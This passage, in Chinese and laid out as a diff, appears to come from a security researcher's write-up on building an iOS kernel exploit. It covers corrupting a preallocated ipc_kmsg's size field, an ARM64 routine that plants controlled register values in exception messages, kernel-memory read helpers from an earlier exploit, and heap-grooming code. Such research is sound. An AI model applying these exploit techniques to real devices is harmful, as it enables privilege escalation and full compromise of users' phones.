@@ -1,0 +1,148 @@
+    MACRO_END
+该宏使用ikm_size字段来设置ikm_header字段，使消息与缓冲区的末尾对齐。
+最后还要检查ipc_kmsg_get_from_kernel：
+      if (msg_and_trailer_size > kmsg->ikm_size - max_desc) {
+        ip_unlock(dest_port);
+        return MACH_SEND_TOO_LARGE;
+      }
+这是使用ikm_size字段来确保消息的ikm_kmsg缓冲区中有足够的空间。
+看来，如果我们破坏了ikm_size字段，就能让内核相信消息缓冲区的大小大于其实际尺寸，这几乎肯定会导致消息内容被写出界。不过，这里只是从一个内核堆溢出到…另一个内核堆溢出吗？
+这次的差异在于，一个损坏的ipc_kmsg还可能让我越界读取内存。所以，破坏ikm_size字段可能是一件有趣的事情。
+**关于消息的发送**
+ikm_kmsg结构用于保存传输中的信息。当用户空间发送mach消息时，最终会用到ipc_kmsg_alloc。如果消息很小（小于IKM_SAVED_MSG_SIZE），则代码将首先查看cpu本地缓存，以寻找最近释放的ikm_kmsg结构。如果没有找到的话，就从专用的ipc.kmsg
+zalloc区域分配一个新的可缓存消息。
+更大的消息则由kalloc（通用内核堆分配器）直接分配。在分配缓冲区之后，使用我们见过的两个宏立即初始化该结构：
+      kmsg = (ipc_kmsg_t)kalloc(ikm_plus_overhead(max_expanded_size));
+    ...  
+      if (kmsg != IKM_NULL) {
+        ikm_init(kmsg, max_expanded_size);
+        ikm_set_header(kmsg, msg_and_trailer_size);
+      }
+      return(kmsg);
+除非我们能够破坏这两个宏之间的ikm_size字段，否则我们最有可能做到的是使消息被释放到错误的区域并立即引起panic。
+但是ikm_set_header还在另一个地方被调用：ipc_kmsg_get_from_kernel。
+该函数仅在内核发送真正的mach消息时使用；例如，它不用于发送内核MIG API的响应。这个函数的注释非常有帮助：
+      * Routine: ipc_kmsg_get_from_kernel
+     * Purpose:
+     *  First checks for a preallocated message
+     *  reserved for kernel clients.  If not found -     *  allocates a new kernel message buffer.
+     *  Copies a kernel message to the message buffer.
+通过用户空间中的mach_port_allocate_full方法，我们可以分配一个新的mach端口，它具有一个大小可控的单个预分配的ikm_kmsg缓冲区。预期的用例是允许用户空间接收关键消息，而内核不必进行堆分配。每当内核发送真正的mach消息时，它首先检查端口是否为这些预先分配的缓冲区之一，并且当前尚未使用。然后，进入下列代码（为了简洁起见，已经删除了无关代码）：
+      if (IP_VALID(dest_port) && IP_PREALLOC(dest_port)) {
+        mach_msg_size_t max_desc = 0;
+        kmsg = dest_port->ip_premsg;
+        if (ikm_prealloc_inuse(kmsg)) {
+          ip_unlock(dest_port);
+          return MACH_SEND_NO_BUFFER;
+        }
+        if (msg_and_trailer_size > kmsg->ikm_size - max_desc) {
+          ip_unlock(dest_port);
+          return MACH_SEND_TOO_LARGE;
+        }
+        ikm_prealloc_set_inuse(kmsg, dest_port);
+        ikm_set_header(kmsg, msg_and_trailer_size);
+        ip_unlock(dest_port);
+    ...  
+      (void) memcpy((void *) kmsg->ikm_header, (const void *) msg, size);
+这段代码检查消息是否适合（信任kmsg->
+ikm_size），将预分配的缓冲区标记为正在使用，调用ikm_set_header宏，设置ikm_header，使消息与缓冲区的结尾对齐，最后调用memcpy将消息复制到ipc_kmsg中。
+这意味着如果我们可以破坏预先分配的ipc_kmsg的ikm_size字段，并使其看起来比实际情况大的话，则会将消息内容写入预分配的消息缓冲区的末尾。
+ikm_header还用于mach消息接收路径，所以当我们得消息出队时，它也将读出边界。如果我们可以使用要读取的数据替换消息缓冲区之后的内容，我们就可以将其作为消息内容的一部分读取。
+我们正在构建的这个新原语在另一个方面更强大：如果我们得手了，我们将能够以可重复的、受控的方式进行越界读写，而不必每次触发漏洞。
+**异常行为**
+在使用预分配的消息的时候，存在一个难点：因为只有当内核向我们发送消息时才使用它们，所以我们不能只发送带有受控数据的消息，并使其使用预先分配的ipc_kmsg。相反，我们需要设法让内核向我们发送一个带有我们控制的数据的消息，这是非常困难的！
+内核中只有少数几处实际向用户空间发送mach消息。不过，但是存在各种类型的通知消息，如IODataQueue数据可用通知、IOServiceUserNotifications和无发送者通知。这些通知一般只包含少量用户控制的数据。由内核发送的、并且包含大量用户控制数据的唯一消息类型是异常消息。
+当线程发生故障（例如访问未分配的内存或调用软件断点指令）时，内核将向线程注册的异常处理程序端口发送异常消息。
+如果线程没有异常处理程序端口，内核将尝试将消息发送到任务的异常处理程序端口，如果还失败了，异常消息将被传递到全局主机异常端口。线程可以正常设置自己的异常端口，但设置主机异常端口是特权操作。
+    routine thread_set_exception_ports(
+              thread         : thread_act_t;
+              exception_mask : exception_mask_t;
+              new_port       : mach_port_t;
+              behavior       : exception_behavior_t;
+              new_flavor     : thread_state_flavor_t);
+这是thread_set_exception_ports的MIG定义。new_port应该是新的异常端口的发送权限。我们可以使用exception_mask来限制我们要处理的异常类型。behaviour定义了我们想要接收什么类型的异常消息，而new_flavor可以指定要包含在消息中的进程状态。
+通过给EXC_MASK_ALL、用于behavior的EXCEPTION_STATE和用于new_flavor的ARM_THREAD_STATE64传递exception_mask，则内核就会发送一个exception_raise_state消息到我们指定的线程发生故障时使用的异常端口。该消息将包含所有ARM64通用寄存器的状态，这就是我们所用的受控数据，它们将被写到ipc_kmsg缓冲区结尾之外！
+**相关的汇编代码**
+在我们的iOS XCode项目中，我们可以添加一个新的汇编文件，并定义一个函数load_regs_and_crash：
+    .text
+    .globl  _load_regs_and_crash
+    .align  2
+    _load_regs_and_crash:
+    mov x30, x0
+    ldp x0, x1, [x30, 0]
+    ldp x2, x3, [x30, 0x10]
+    ldp x4, x5, [x30, 0x20]
+    ldp x6, x7, [x30, 0x30]
+    ldp x8, x9, [x30, 0x40]
+    ldp x10, x11, [x30, 0x50]
+    ldp x12, x13, [x30, 0x60]
+    ldp x14, x15, [x30, 0x70]
+    ldp x16, x17, [x30, 0x80]
+    ldp x18, x19, [x30, 0x90]
+    ldp x20, x21, [x30, 0xa0]
+    ldp x22, x23, [x30, 0xb0]
+    ldp x24, x25, [x30, 0xc0]
+    ldp x26, x27, [x30, 0xd0]
+    ldp x28, x29, [x30, 0xe0]
+    brk 0
+    .align  3
+该函数接收一个指向240字节缓冲区的指针作为第一个参数，然后将该缓冲区的值放到前30个ARM64通用寄存器中，以便当通过brk
+0触发软件中断时，内核发送的异常消息能够以相同的顺序存放来自输入缓冲区的字节。
+我们现在已经有了一种获取将被发送到预分配端口的消息中的受控数据的方法，但是我们应该用什么值覆盖ikm_size，才能使消息的受控部分与后面堆对象的开始重叠呢？
+通过静态方式可能做到这一点，但是如果使用内核调试器考察发送的情况的话，事情会更简单。然而，iOS只能运行在特定的硬件上，并且它们也没有提供内核调试方面的支持。
+**打造自己的内核调试器（使用printfs和hexdumps）**
+通常调试器有两个主要功能：断点和内存读写。实现断点非常麻烦，但是我们仍然可以使用内核内存访问来打造一个内核调试环境。
+这里需要处理引导问题；我们需要一个内核漏洞利用，让我们进行内核内存访问，以便开发我们的内核漏洞利用代码来提供内核内存访问功能！在12月份，我发布了mach_portal
+iOS内核漏洞利用代码，提供了内核内存读/写能力，其中的一些内核内省函数还允许您按名称查找进程任务结构和查找mach端口对象。我们可以转储Mach端口的kobject指针。
+这个新漏洞的第一个版本是在mach_portal xcode项目中开发的，所以我可以重用所有的代码。一切就绪后，我会将其从iOS 10.1.1移植到iOS
+10.2。
+在mach_portal里面，我可以找到一个预先分配的端口缓冲区的地址，如下所示：
+     // allocate an ipc_kmsg:
+     kern_return_t err;
+     mach_port_qos_t qos = {0};
+     qos.prealloc = 1;
+     qos.len = size;
+     mach_port_name_t name = MACH_PORT_NULL;
+     err = mach_port_allocate_full(mach_task_self(),
+                                   MACH_PORT_RIGHT_RECEIVE,
+                                   MACH_PORT_NULL,
+                                   &qos,
+                                   &name);
+     uint64_t port = get_port(name);
+     uint64_t prealloc_buf = rk64(port+0x88);
+     printf("0x%016llx,n", prealloc_buf);
+    get_port是mach_portal漏洞利用代码的一部分，其定义如下： 
+    uint64_t get_port(mach_port_name_t port_name){
+      return proc_port_name_to_port_ptr(our_proc, port_name);
+    }
+    uint64_t proc_port_name_to_port_ptr(uint64_t proc, mach_port_name_t port_name) {
+      uint64_t ports = get_proc_ipc_table(proc);
+      uint32_t port_index = port_name >> 8;
+      uint64_t port = rk64(ports + (0x18*port_index)); //ie_object
+      return port;
+    }
+    uint64_t get_proc_ipc_table(uint64_t proc) {
+      uint64_t task_t = rk64(proc + struct_proc_task_offset);
+      uint64_t itk_space = rk64(task_t + struct_task_itk_space_offset);
+      uint64_t is_table = rk64(itk_space + struct_ipc_space_is_table_offset);
+      return is_table;
+    }
+这些代码片段都使用了通过内核任务端口读取内核内存的mach_portal利用代码的rk64（）函数。
+我通过试错法来确定哪些值覆盖ikm_size后可以使异常消息的受控部分与下一个堆对象的开头对齐。
+**get-where-what**
+解决这个谜题的最后一步是要能够找到受控数据在哪里。
+在本地提权攻击的上下文中实现该目的的一种方法是将这种数据放置到用户空间中，但像x86上的SMAP和iPhone
+7上的AMCC硬件这样的硬件安全措施使得这种方法非常困难。因此，我们将构建一个新的原语，以找出我们的ipc_kmsg缓冲区在内核内存中的位置。
+直到现在还没有触及的一个方面是如何将ipc_kmsg分配到我们要溢出的缓冲区边上。Stefan
+Esser曾经在一些演讲中谈过近几年zalloc堆的演变情况，最新的演讲具有区释放列表随机化的细节。
+在使用上述内省技术对堆行为进行实验的过程中，我注意到某些尺寸的类实际上仍然以接近线性的方式进行分配（后面的分配是连续的）。事实证明，这是由于zalloc是从较低级别的分配器获取内存页的；通过耗尽特定区域，我们可以强制zalloc获取新页面，如果我们的分配大小接近页面大小，我们就能立即将该页面返回。
+这意味着我们可以使用如下代码：
+      int prealloc_size = 0x900; // kalloc.4096
+      for (int i = 0; i < 2000; i++){
+        prealloc_port(prealloc_size);
+      }
+      // these will be contiguous now, convenient!
+      mach_port_t holder = prealloc_port(prealloc_size);
+      mach_port_t first_port = prealloc_port(prealloc_size);
+      mach_port_t second_port = prealloc_port(prealloc_size);
+为了获得如下所示的堆布局：
